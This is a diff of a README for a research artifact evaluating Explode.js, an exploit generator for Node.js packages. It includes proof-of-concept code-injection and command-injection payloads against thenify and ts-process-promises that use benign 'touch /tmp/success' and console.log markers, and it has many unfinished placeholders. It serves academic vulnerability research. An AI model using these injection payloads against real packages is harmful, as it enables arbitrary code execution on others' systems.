@@ -1,11 +1,9 @@
-<h1 align="center", style="font-size: 32px">Automated Exploit Generation for Node.js Packages</h1>
+Automated Exploit Generation for Node.js Packages
 
 This artifact evaluates Explode.js, a novel tool for synthesizing exploits for Node.js applications.
 By combining static analysis and symbolic execution, Explode.js generates functional exploits that confirm the existence of command injection, code injection, prototype pollution, and path traversal vulnerabilities.
 The repository includes all source code, reference datasets and instructions on how to build and run the experiments.
 These experiments result in the tables and plots presented in the paper, which can be used to validate the results.
-
-<br>
 
 # A. Getting Started
 
@@ -57,44 +55,90 @@ Explode.js
 └── README.md
 ```
 
-There are three Docker containers, `[FIXME]`, `[FIXME]`, and `[FIXME]`, one for each of the tools under evaluation: Explode.js, FAST, and NodeMedic-Fine, respectively.
+There are three Docker containers, `explode-js_image.tar.gz`, `fast_image.tar.gz`, and `nodemedic_image.tar.gz`, one for each of the tools under evaluation: Explode.js, FAST, and NodeMedic-Fine, respectively.
 The experiments for each tool must be executed within its designated Docker container.
-
-<br>
 
 ## A.2. Getting Started with Explode.js
 
-**Setup.** 
-To setup the environment, load the Explode.js Docker image `[FIXME]`, with the following command:
+**Setup.**
+To setup the environment, load the Explode.js Docker image `explode-js_image.tar.gz`, with the following command:
 
 ```sh
-[FIXME]
+$ docker load < explode-js_image.tar.gz
 ```
 
 **Basic Testing.**
 To verify that the image is properly loaded and that the tool is running as expected, run Explode.js for the [TODO] example using the following command:
 
 ```sh
-[FIXME]
+$ docker run --rm -it explode-js bash
+$ cd explode-js/example
+$ explode-js full running-example/index.js
 ```
 
 **Output.** The output of the previous command should be:
 
 ```
-[FIXME]
+[STEP 1] MDG: Generating...
+
+[STEP 1] MDG: Completed.
+[STEP 2] Queries: Importing the graph...
+[INFO] Stop running Neo4j local instance.
+[INFO] Import MDG to Neo4j.
+[INFO] Starting Neo4j
+[STEP 2] Queries: Imported
+[STEP 3] Queries: Traversing Graph...
+[INFO] Running injection query.
+[INFO] Reconstructing attacker-controlled data.
+[INFO] Assigning types to attacker-controlled data.
+[INFO] Assigning types to attacker-controlled data.
+[INFO] Assigning types to attacker-controlled data.
+[INFO] Assigning types to attacker-controlled data.
+[INFO] Assigning types to attacker-controlled data.
+[INFO] Assigning types to attacker-controlled data.
+[INFO] Assigning types to attacker-controlled data.
+[INFO] Assigning types to attacker-controlled data.
+[INFO] Assigning types to attacker-controlled data.
+[INFO] Assigning types to attacker-controlled data.
+[INFO] Assigning types to attacker-controlled data.
+[INFO] Assigning types to attacker-controlled data.
+[INFO] Running prototype pollution query.
+[INFO] Prototype Pollution - Reconstructing attacker-controlled data.
+[INFO] Detected 1 vulnerabilities.
+[STEP 3] Queries: Completed.
+── PHASE 1: TEMPLATE GENERATION ──
+✔ Loaded: _results/taint_summary.json
+⚒ Generating 1 template(s):
+├── 📄 ./symbolic_test_0.js
+
+── PHASE 2: ANALYSIS & VALIDATION ──
+◉ [1/1] Procesing ./symbolic_test_0.js
+├── Symbolic execution output:
+"Uncaught TypeError"
+"Uncaught TypeError"
+"File too big"
+Exec failure: (str.++
+               ((str.++
+                 ((str.++
+                   ((str.++ ((str.++ ("rsync -av /tmp/0 ", id)), "@")),
+                   host)), ":")), dstDir))
+├── Symbolic execution stats: clock: 30.812713s | solver: 30.421486s
+├── ⚠ Detected 1 issue(s)!
+│   ├── ↺ Replaying 2 test case(s)
+│   │   ├── 📄 [1/2] Using test case: ./symbolic_test_0/test-suite/witness-0.json
+│   │   │   ├── Node exited with 0
+│   │   │   └── ✔ Status: Success (created file "./success")
 ```
 
 The generated exploit can be found in the file `[FIXME]`.
 
-<br>
+## A.3. Getting Started with FAST
 
-## A.3. Getting Started with *FAST*
-
-**Setup.** 
-To setup the environment, one can load the FAST Docker image `fast_image.tar.gz`, with the following command:
+**Setup.**
+To setup the environment, load the FAST Docker image `fast_image.tar.gz`, with the following command:
 
 ```sh
-$ docker load --input fast_image.tar.gz
+$ docker load < fast_image.tar.gz
 ```
 
 Then, to create and start container from the loaded image one can use:
@@ -106,7 +150,7 @@ $ docker run -it -h fast fast
 To ensure that the tool is running as expected, one can verify it by running FAST on the `thenify@3.3.0` package with the following command:
 
 ```sh
-explodejs@fast~$ cd explode-js && python3 run-fast.py datasets out --packages thenify 
+$ cd explode-js && python3 run-fast.py datasets out --packages thenify
 ```
 
 **Output.** The output of the previous command should be:
@@ -122,12 +166,12 @@ Running: python3 -m simurun -t code_exec -X datasets/vulcan-dataset/CWE-94/GHSA-
 ```
 The output table is also saved in `.csv` format as `fast-parsed-results.csv`.
 
-FAST does not generate exploits. 
+FAST does not generate exploits.
 Instead, it generates a trace with information regarding the inputs to activate the exploit.
 In this case, FAST generates the trace to stdout. Part of it is given below
 
 ```
-Attack Path: 
+Attack Path:
 ==========================
 /home/explodejs/explode-js/datasets/vulcan-dataset/CWE-94/GHSA-29xr-v42j-r956/src/index.js
 
@@ -168,49 +212,28 @@ return eval(createWrapper($$__fn__$$.name, options))
 The full trace can be found in the saved stdout file: `out/5_fast/fast-stdout.log`. One can manually construct the exploit for the above example:
 
 ```js
-// Line 28: Vulnerable function definition
-thenify.withCallback = function ($$__fn__$$, options) {
-    assert(typeof $$__fn__$$ === 'function');
-    options = options || {};
-    options.withCallback = true;
-    if (options.multiArgs === undefined) options.multiArgs = true;
-    return eval(createWrapper($$__fn__$$.name, options));  // Line 28
+var thenify = require("thenify");
+var $$__fn__$$ = {
+    name: "() {} && console.log('success') && some"
 }
-
-// Line 60: Creating the multiArgs string
-multiArgs = 'var multiArgs = ' + JSON.stringify(multiArgs) + '\n';
-
-// Line 67: Creating the wrapper function for the $$__fn__$$
-return '(function ' + name + '() {\n'
-    + 'var self = this\n'
-    + 'var len = arguments.length\n'
-    + multiArgs  // Line 67 (inserting multiArgs)
-    + withCallback
-    + 'var args = new Array(len + 1)\n'
-    + 'for (var i = 0; i < len; ++i) args[i] = arguments[i]\n'
-    + 'var lastIndex = i\n'
-    + 'return new Promise(function (resolve, reject) {\n'
-        + 'args[lastIndex] = createCallback(resolve, reject, multiArgs)\n'
-        + '$$__fn__$$.apply(self, args)\n'
-    + '})\n'
-+ '})'
-
-// Line 17: eval function call
-return eval(createWrapper($$__fn__$$.name, options));  // Line 17
+var options = {};
+thenify.withCallback($$__fn__$$, options);
 ```
-
-<br>
 
 ## A.4. Getting Started with *NodeMedic-Fine*
 
-**Setup.** 
-To set up the environment, run the installation script for NodeMedic-Fine benchmarking using the following command:
+**Setup.**
+To setup the environment, load the NodeMedic-Fine Docker image `nodemedic_image.tar.gz`, with the following command:
 
 ```sh
-$ ./nodeMedic-bench-install.sh
+$ docker load < nodemedic_image.tar.gz
 ```
 
 This script will build NodeMedic's official Docker image and install two Python modules necessary for generating the output.
+
+```sh
+$ python3 -m pip install pandas~=2.2.3 tabulate~=0.9.0
+```
 
 **Basic Testing.**
 To verify that the image is properly loaded and that the tool is running as expected, run NodeMedic for the `ts-process-promises@1.0.2` example using the following command:
@@ -237,7 +260,7 @@ One of the generated exploits can be found in the file `out/ts-process-promises@
 // JALANGI DRIVER
 process.backup_exit = process.exit;
 process.exit = function(){console.log("Tried calling process.exit")};
-    
+
 var PUT = require('/nodetaint/packageData/ts-process-promises/node_modules/ts-process-promises');
 try {
 	var x0 = " $(touch /tmp/success) # \" || touch /tmp/success # ' || touch /tmp/success";
@@ -248,25 +271,18 @@ new PUT["exec"](x0,x1)();
 }
 ```
 
-
-
-<br>
-
-
-
 # B. Step-By-Step Instructions
 
-
-With this artifact, our goal is to demonstrate the following claims of the paper, each corresponding to one of its main research questions: 
+With this artifact, our goal is to demonstrate the following claims of the paper, each corresponding to one of its main research questions:
 
 - **Claim 1** *(RQ1 - Section 6.1): Effectiveness in Exploit Generation.*
-Explode.js is more effective in generating exploits than its main competitor tools. 
+Explode.js is more effective in generating exploits than its main competitor tools.
 
 - **Claim 2** *(RQ2 - Section 6.2): Exploit Generation in the Wild.*
-Explode.js is able to find new exploits for real-wold Node.js modules in the wild. 
+Explode.js is able to find new exploits for real-wold Node.js modules in the wild.
 
 - **Claim 3** *(RQ3 - Section 6.3): Performance Evaluation.*
-Explode.js is able to generate exploits in feasible time, but is less performant than its main competitor tools. 
+Explode.js is able to generate exploits in feasible time, but is less performant than its main competitor tools.
 
 - **Claim 4** *(RQ4 - Section 6.4): Necessity of Explode.js Components.*
 The core techniques of Explode.js (VISes and lazy values) are key to its effectiveness.
@@ -279,8 +295,6 @@ This parameter can affect the results produced, since different machines may exp
 Consequently, there can be slight variations in the results, but all claims are expected to verified.
 
 **Paper Discrepancies.** FIXME
-
-<br>
 
 ## B.1. Claims 1 and 3
 
@@ -306,11 +320,11 @@ Run the following command in the folder `[FIXME]`:
 [FIXME]
 ```
 
-This will take approximately `[FIXME]` hours. 
+This will take approximately `[FIXME]` hours.
 To determine if the execution was successful, check if `[FIXME]`.
 
 The generated exploits are stored `[FIXME]`.
-To check the exploit generated for a specific package, say the `[FIXME]` package, see file `[FIXME]`. 
+To check the exploit generated for a specific package, say the `[FIXME]` package, see file `[FIXME]`.
 
 To generate the Explode.js results of Table 3, run in the folder `[FIXME]`:
 
@@ -332,12 +346,12 @@ Run the following command in the folder `[FIXME]`:
 [FIXME]
 ```
 
-This will take approximately `[FIXME]` hours. 
+This will take approximately `[FIXME]` hours.
 To determine if the execution was successful, check if `[FIXME]`
 
 As stated before, FAST does not generate executable exploits; those have to be manually put together from the output trace information.
 We have done that for all the generated traces in the dataset, which can be consulted in the folder `[FIXME]`.
-To check the exploit generated for a specific package, say the `[FIXME]` package, see file `[FIXME]`. 
+To check the exploit generated for a specific package, say the `[FIXME]` package, see file `[FIXME]`.
 
 To generate the FAST results of Table 3, run in the folder `[FIXME]`:
 
@@ -359,11 +373,11 @@ Run the following command in the folder `[FIXME]`:
 [FIXME]
 ```
 
-This will take approximately `[FIXME]` hours. 
+This will take approximately `[FIXME]` hours.
 To determine if the execution was successful, check if `[FIXME]`.
 
 The generated exploits are stored `[FIXME]`.
-To check the exploit generated for a specific package, say the `[FIXME]` package, see file `[FIXME]`. 
+To check the exploit generated for a specific package, say the `[FIXME]` package, see file `[FIXME]`.
 
 To generate the NodeMedic-Fine results of Table 3, run in the folder `[FIXME]`:
 
@@ -387,7 +401,7 @@ For instance, if we wanted to confirm the results of Explode.js for just code-in
 [FIXME]
 ```
 
-The flags for the other types of vulnerabilities are: `command-injection`, `prototype-pollution`, and `path-traversal`. 
+The flags for the other types of vulnerabilities are: `command-injection`, `prototype-pollution`, and `path-traversal`.
 
 <br>
 
@@ -400,7 +414,7 @@ specifically those of Table 5, which we reproduce below:
 
 `[TODO]`
 
-To reproduce the results of the table above, we provide the set of packages for which Explode.js found 
+To reproduce the results of the table above, we provide the set of packages for which Explode.js found
 new vulnerabilities in `[FIXME]` and a script to run Explode.js on these packages.
 To run Explode.js on the wild packages in which new vulnerabilities were found, run:
 
@@ -409,7 +423,7 @@ To run Explode.js on the wild packages in which new vulnerabilities were found, 
 ```
 
 The scripts output a version of the table above and the generated exploits can be found in the `FIXME` folder.
-To check the exploit generated for a specific package, say the `[FIXME]` package, see file `[FIXME]`. 
+To check the exploit generated for a specific package, say the `[FIXME]` package, see file `[FIXME]`.
 
 To generate Table 5, run in the folder `[FIXME]`:
 
@@ -429,7 +443,7 @@ specifically those of Table 7, which we reproduce below:
 `[TODO]`
 
 To reproduce the results of the table above, one must first run Explode.js without VISes and Lazy Values.
-Importantly, you must have previously run Explode.js with lazy values and VISes as instructed in section B.1. 
+Importantly, you must have previously run Explode.js with lazy values and VISes as instructed in section B.1.
 
 To execute Explode.js without VISes run in the folder `[FIXME]`:
 
@@ -437,7 +451,7 @@ To execute Explode.js without VISes run in the folder `[FIXME]`:
 [FIXME]
 ```
 
-This will take approximately `[FIXME]` hours. 
+This will take approximately `[FIXME]` hours.
 To determine if the execution was successful, check if `[FIXME]`.
 
 To execute Explode.js without Lazy Values, run in the folder `[FIXME]`:
@@ -446,7 +460,7 @@ To execute Explode.js without Lazy Values, run in the folder `[FIXME]`:
 [FIXME]
 ```
 
-This will take approximately `[FIXME]` hours. 
+This will take approximately `[FIXME]` hours.
 To determine if the execution was successful, check if `[FIXME]`.
 
 To generate Table 7, run in the folder `[FIXME]`:
